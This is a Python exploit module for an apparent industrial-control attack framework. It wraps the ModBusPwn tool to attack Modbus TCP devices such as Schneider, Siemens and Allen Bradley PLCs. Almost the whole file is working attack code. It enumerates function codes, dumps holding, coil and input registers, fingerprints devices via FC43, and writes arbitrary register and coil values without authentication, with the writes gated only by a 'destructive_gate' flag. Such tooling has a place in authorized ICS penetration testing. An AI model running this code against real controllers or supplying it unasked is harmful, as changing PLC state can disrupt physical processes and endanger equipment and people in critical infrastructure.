"""ModBusPwn Integration — Modbus TCP Recon and Register Attack Framework.

Source: InfoSec-DB/ModBusPwn (https://github.com/InfoSec-DB/ModBusPwn)
License: MIT
Integration: IndustrialXPL protocols/modbus/

ModBusPwn provides:
  - Full Modbus TCP device reconnaissance (function code enumeration)
  - Register read/write attack vectors (coil, holding, input, discrete)
  - Device fingerprinting via FC43 (Device Identification)
  - Unauthenticated mass write for register manipulation
  - Replay attack support

This module wraps ModBusPwn as a native IndustrialXPL exploit module,
providing the standard check()/run() interface with all ModBusPwn
capabilities accessible through IXF options.

Install: pip install modbuspwn  (or: pip install pymodbus)
"""
from __future__ import annotations

import json
from typing import Optional

from ixf.core.exploit import Base, OptIP, OptPort, OptString, OptInt, OptBool
from ixf.core.exploit import print_status, print_error, print_good


class Exploit(Base):
    """ModBusPwn — Modbus TCP Recon and Register Attack (IXF Integration).

    Wraps the ModBusPwn framework to provide:
    - Full device scan (all supported function codes)
    - Holding register dump (FC03)
    - Coil read (FC01) and write (FC05/FC15)
    - Device identification (FC43)
    - Arbitrary register write for PLC manipulation
    """

    __info__ = {
        "name": "ModBusPwn Modbus TCP Attack Framework",
        "description": (
            "Modbus TCP reconnaissance and register manipulation using the "
            "ModBusPwn framework. Covers FC01/03/04/05/06/15/16/43 attack vectors."
        ),
        "authors": (
            "InfoSec-DB (ModBusPwn original)",
            "Andre Henrique (@mrhenrike) — IXF integration",
        ),
        "references": (
            "https://github.com/InfoSec-DB/ModBusPwn",
            "https://www.modbustools.com/modbus.html",
        ),
        "protocols": ("Modbus TCP (port 502)",),
        "devices": (
            "Schneider Electric PLCs",
            "Siemens S7 with Modbus bridge",
            "Allen Bradley with Modbus adapter",
            "Any ICS device with Modbus TCP enabled",
        ),
    }

    target = OptIP("", "Target Modbus TCP host")
    port = OptPort(502, "Modbus TCP port (default 502)")
    unit_id = OptInt(1, "Modbus unit/slave ID (1-247)")
    mode = OptString("scan", "Mode: scan | dump_holding | dump_coils | write_register | device_id")
    register_start = OptInt(0, "Register start address (for dump/write)")
    register_count = OptInt(100, "Number of registers to read")
    write_address = OptInt(0, "Register address to write (write_register mode)")
    write_value = OptInt(0, "Value to write (write_register mode)")
    destructive_gate = OptBool(False, "Set True to allow register writes (modifies PLC state)")

    def _get_client(self):
        """Get a pymodbus ModbusTcpClient."""
        try:
            from pymodbus.client import ModbusTcpClient
            client = ModbusTcpClient(self.target, port=int(self.port))
            if not client.connect():
                raise ConnectionError(f"Cannot connect to {self.target}:{self.port}")
            return client
        except ImportError:
            print_error("pymodbus not installed. Run: pip install pymodbus")
            return None

    def check(self) -> bool:
        """Verify Modbus TCP connectivity and basic FC03 access."""
        client = self._get_client()
        if not client:
            return False
        try:
            result = client.read_holding_registers(0, 1, slave=int(self.unit_id))
            if not result.isError():
                print_good(f"Modbus TCP responding at {self.target}:{self.port} (unit {self.unit_id})")
                client.close()
                return True
            else:
                print_status(f"FC03 error: {result} — trying other FCs")
                # Try FC01 (coils)
                r2 = client.read_coils(0, 1, slave=int(self.unit_id))
                if not r2.isError():
                    print_good("FC01 (coils) accessible")
                    client.close()
                    return True
        except Exception as exc:
            print_error(f"Modbus check error: {exc}")
        finally:
            client.close()
        return False

    def _scan(self, client) -> dict:
        """Full function code enumeration."""
        results = {}
        fc_tests = {
            "FC01_coils": lambda: client.read_coils(0, 10, slave=int(self.unit_id)),
            "FC02_discrete": lambda: client.read_discrete_inputs(0, 10, slave=int(self.unit_id)),
            "FC03_holding": lambda: client.read_holding_registers(0, 10, slave=int(self.unit_id)),
            "FC04_input_regs": lambda: client.read_input_registers(0, 10, slave=int(self.unit_id)),
        }
        for name, func in fc_tests.items():
            try:
                r = func()
                if not r.isError():
                    results[name] = "ACCESSIBLE"
                    print_good(f"  {name}: ACCESSIBLE")
                else:
                    results[name] = f"ERROR: {r}"
            except Exception as exc:
                results[name] = f"EXCEPTION: {exc}"

        # FC43 Device Identification
        try:
            r = client.read_device_information(slave=int(self.unit_id))
            if not r.isError():
                results["FC43_device_id"] = str(r.information)
                print_good(f"  FC43 Device ID: {results['FC43_device_id']}")
        except Exception:
            pass
        return results

    def _dump_registers(self, client, fc: str) -> list:
        """Dump holding registers or coils."""
        values = []
        start = int(self.register_start)
        count = int(self.register_count)
        try:
            if fc == "holding":
                r = client.read_holding_registers(start, count, slave=int(self.unit_id))
            elif fc == "coils":
                r = client.read_coils(start, count, slave=int(self.unit_id))
            elif fc == "input":
                r = client.read_input_registers(start, count, slave=int(self.unit_id))
            else:
                return []

            if r.isError():
                print_error(f"Dump failed: {r}")
                return []

            values = getattr(r, "registers", None) or getattr(r, "bits", [])
            print_good(f"Read {len(values)} {fc} values from address {start}:")
            for i, v in enumerate(values):
                print_status(f"  [{start + i}] = {v} (0x{v:04X})" if isinstance(v, int) else f"  [{start + i}] = {v}")
        except Exception as exc:
            print_error(f"Dump error: {exc}")
        return values

    def run(self) -> None:
        if not self.check():
            print_error("Modbus TCP not accessible")
            return

        client = self._get_client()
        if not client:
            return

        mode = self.mode.lower()
        print_status(f"Mode: {mode} on {self.target}:{self.port} unit={self.unit_id}")

        try:
            if mode == "scan":
                results = self._scan(client)
                print_status(f"Scan complete: {json.dumps(results, indent=2)}")

            elif mode == "dump_holding":
                self._dump_registers(client, "holding")

            elif mode == "dump_coils":
                self._dump_registers(client, "coils")

            elif mode == "dump_input":
                self._dump_registers(client, "input")

            elif mode == "device_id":
                try:
                    r = client.read_device_information(slave=int(self.unit_id))
                    if not r.isError():
                        print_good(f"Device identification: {r.information}")
                    else:
                        print_error(f"FC43 failed: {r}")
                except Exception as exc:
                    print_error(f"Device ID failed: {exc}")

            elif mode == "write_register":
                if not self.destructive_gate:
                    print_error(
                        "Register writes require destructive_gate=True "
                        "(this modifies PLC/ICS device state — potentially dangerous)"
                    )
                    return
                addr = int(self.write_address)
                val = int(self.write_value)
                print_status(f"Writing {val} (0x{val:04X}) to holding register {addr}...")
                r = client.write_register(addr, val, slave=int(self.unit_id))
                if not r.isError():
                    print_good(f"Register {addr} written successfully")
                else:
                    print_error(f"Write failed: {r}")

            elif mode == "write_coil":
                if not self.destructive_gate:
                    print_error("Coil writes require destructive_gate=True")
                    return
                addr = int(self.write_address)
                val = bool(int(self.write_value))
                r = client.write_coil(addr, val, slave=int(self.unit_id))
                if not r.isError():
                    print_good(f"Coil {addr} set to {val}")
                else:
                    print_error(f"Coil write failed: {r}")

            else:
                print_error(f"Unknown mode: {mode}. Use: scan | dump_holding | dump_coils | dump_input | device_id | write_register | write_coil")

        finally:
            client.close()
